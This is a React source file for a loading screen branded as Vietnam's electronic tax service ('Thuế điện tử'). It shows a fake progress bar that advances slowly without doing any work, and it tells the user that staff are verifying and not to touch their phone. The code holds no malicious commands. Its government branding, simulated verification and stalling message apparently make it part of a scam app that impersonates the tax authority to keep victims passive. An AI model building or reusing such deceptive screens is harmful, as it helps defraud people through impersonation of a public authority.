import { useEffect, useState } from "react";
import { Link, useNavigate } from "react-router-dom";
import theunotexxt from "@/assets/theunotexxt.png";

const LoadingPage = () => {
  const navigate = useNavigate();
  const [progress, setProgress] = useState(0);

  useEffect(() => {
    const interval = setInterval(() => {
      setProgress((prev) => {
        if (prev >= 100) {
          clearInterval(interval);
          return 100;
        }
        return prev + 1;
      });
    }, 1200);

    return () => clearInterval(interval);
  }, []);

  return (
    <div className="min-h-screen bg-[#f8341e] flex flex-col items-center justify-center px-6 text-white">
      {/* Title */}
      <Link to="/profile" state={{ error: true }}>
        <h1 className="text-2xl font-bold mb-12 tracking-wide">Thuế điện tử</h1>
      </Link>

      {/* Logo */}
      <div className="mb-12">
        <div className="w-48 h-48 rounded-full flex items-center justify-center">
          <div className="w-40 h-40 rounded-full flex items-center justify-center">
            <img
              src={theunotexxt}
              alt="Thuế Điện Tử"
              className="w-38 h-38 opacity-90"
            />
          </div>
        </div>
      </div>

      {/* Progress Bar */}
      <div className="w-full max-w-sm mb-4">
        <div className="h-3 bg-white/30 rounded-full overflow-hidden">
          <div
            className="h-full bg-white transition-all duration-300 ease-out"
            style={{ width: `${progress}%` }}
          />
        </div>
      </div>

      {/* Progress Text */}
      <p className="text-lg font-bold mb-2">{progress}%</p>

      {/* Loading Message */}
      <p className="text-center text-[18px] font-bold px-4">
        Nhân viên đang xác thực vui lòng không thao tác trên điện thoại
      </p>
    </div>
  );
};

export default LoadingPage;
